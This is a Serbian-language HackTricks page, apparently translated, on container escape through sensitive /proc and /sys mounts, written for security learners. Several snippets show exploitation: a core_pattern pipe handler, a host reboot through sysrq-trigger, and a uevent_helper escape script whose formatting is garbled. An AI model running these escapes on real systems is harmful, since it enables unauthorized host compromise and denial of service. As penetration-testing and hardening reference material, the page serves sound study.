# Sensitive Mounts

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Izloženost `/proc` i `/sys` bez odgovarajuće izolacije imenskog prostora predstavlja značajne sigurnosne rizike, uključujući proširenje površine napada i otkrivanje informacija. Ovi direktorijumi sadrže osetljive datoteke koje, ako nisu ispravno konfigurisane ili pristupljene od strane neovlašćenog korisnika, mogu dovesti do bekstva iz kontejnera, modifikacije domaćina ili pružanja informacija koje pomažu daljim napadima. Na primer, nepravilno montiranje `-v /proc:/host/proc` može zaobići AppArmor zaštitu zbog njegove putem zasnovane prirode, ostavljajući `/host/proc` nezaštićenim.

**Možete pronaći dalje detalje o svakom potencijalnom propustu na** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilnosti procfs-a

### `/proc/sys`

Ovaj direktorijum dozvoljava pristup za modifikaciju kernel promenljivih, obično putem `sysctl(2)`, i sadrži nekoliko poddirektorijuma od interesa:

#### **`/proc/sys/kernel/core_pattern`**

* Opisan u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Omogućava definisanje programa za izvršavanje prilikom generisanja core datoteke sa prvih 128 bajtova kao argumentima. Ovo može dovesti do izvršavanja koda ako datoteka počinje sa cev `|`.
* **Primer testiranja i eksploatacije**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testirajte pristup za pisanje
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Postavite prilagođeni rukovalac
sleep 5 && ./crash & # Pokrenite rukovaoca
```

#### **`/proc/sys/kernel/modprobe`**

* Detaljno opisan u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Sadrži putanju do učitavača kernel modula, pozvanog za učitavanje kernel modula.
* **Primer provere pristupa**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Proverite pristup modprobe-u
```

#### **`/proc/sys/vm/panic_on_oom`**

* Povezan u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Globalna oznaka koja kontroliše da li kernel pravi paniku ili poziva OOM ubijalicu kada se pojavi OOM uslov.

#### **`/proc/sys/fs`**

* Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o fajl sistemu.
* Pristup za pisanje može omogućiti različite napade uskraćivanjem usluga na domaćinu.

#### **`/proc/sys/fs/binfmt_misc`**

* Omogućava registraciju interpretatora za ne-nativne binarne formate na osnovu njihovog magičnog broja.
* Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` za pisanje.
* Relevantan eksploatacioni primer i objašnjenje:
* [Rootkit preko binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Detaljan tutorijal: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Ostali u `/proc`

#### **`/proc/config.gz`**

* Može otkriti konfiguraciju kernela ako je `CONFIG_IKCONFIG_PROC` omogućen.
* Korisno za napadače da identifikuju ranjivosti u pokrenutom kernelu.

#### **`/proc/sysrq-trigger`**

* Omogućava pozivanje Sysrq komandi, potencijalno uzrokujući trenutne ponovne pokrete sistema ili druge kritične akcije.
* **Primer ponovnog pokretanja domaćina**:

```bash
echo b > /proc/sysrq-trigger # Ponovno pokreće domaćina
```

#### **`/proc/kmsg`**

* Izlaže poruke kernel prstena.
* Može pomoći u eksploataciji kernela, otkrivanju adresa i pružanju osetljivih informacija o sistemu.

#### **`/proc/kallsyms`**

* Navodi izvožene simbole kernela i njihove adrese.
* Bitno za razvoj eksploatacije kernela, posebno za prevazilaženje KASLR-a.
* Informacije o adresi su ograničene sa `kptr_restrict` postavljenim na `1` ili `2`.
* Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Interfejsira sa uređajem kernel memorije `/dev/mem`.
* Istoriski ranjiv na napade eskalacije privilegija.
* Više o [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Predstavlja fizičku memoriju sistema u ELF core formatu.
* Čitanje može otkriti sadržaj memorije domaćina i drugih kontejnera.
* Veličina datoteke može dovesti do problema sa čitanjem ili rušenjem softvera.
* Detaljna upotreba u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Alternativni interfejs za `/dev/kmem`, predstavlja virtuelnu memoriju kernela.
* Omogućava čitanje i pisanje, stoga direktnu modifikaciju kernel memorije.

#### **`/proc/mem`**

* Alternativni interfejs za `/dev/mem`, predstavlja fizičku memoriju.
* Omogućava čitanje i pisanje, modifikacija sve memorije zahteva rešavanje virtuelnih u fizičke adrese.

#### **`/proc/sched_debug`**

* Vraća informacije o rasporedu procesa, zaobilazeći zaštitu PID imenskog prostora.
* Izlaže imena procesa, ID-ove i identifikatore cgroup-a.

#### **`/proc/[pid]/mountinfo`**

* Pruža informacije o tačkama montiranja u imenskom prostoru montiranja procesa.
* Izlaže lokaciju `rootfs` kontejnera ili slike.

### Vulnerabilnosti `/sys`

#### **`/sys/kernel/uevent_helper`**

* Koristi se za rukovanje kernel uređajima `uevents`.
* Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvolne skripte prilikom okidača `uevent`.
* **Primer eksploatacije**: %%%bash

## Kreira payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

## Pronalazi putanju domaćina iz OverlayFS montaže za kontejner

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

## Postavlja uevent\_helper na zlonamerni pomoćnik

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

## Okida uevent

echo change > /sys/class/mem/null/uevent

## Čita izlaz

cat /output %%%

#### **`/sys/class/thermal`**

* Kontroliše postavke temperature, potencijalno uzrokujući DoS napade ili fizičku štetu.

#### **`/sys/kernel/vmcoreinfo`**

* Otkriva adrese jezgra, potencijalno kompromitujući KASLR.

#### **`/sys/kernel/security`**

* Sadrži `securityfs` interfejs, omogućavajući konfigurisanje Linux Security Modula poput AppArmor-a.
* Pristup može omogućiti kontejneru da onemogući svoj MAC sistem.

#### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**

* Otkriva interfejse za interakciju sa EFI varijablama u NVRAM-u.
* Pogrešna konfiguracija ili eksploatacija može dovesti do oštećenih laptopova ili neupotrebljivih host mašina.

#### **`/sys/kernel/debug`**

* `debugfs` nudi "bez pravila" interfejs za debagovanje jezgra.
* Istorija sigurnosnih problema zbog njegove neograničene prirode.

### Reference

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
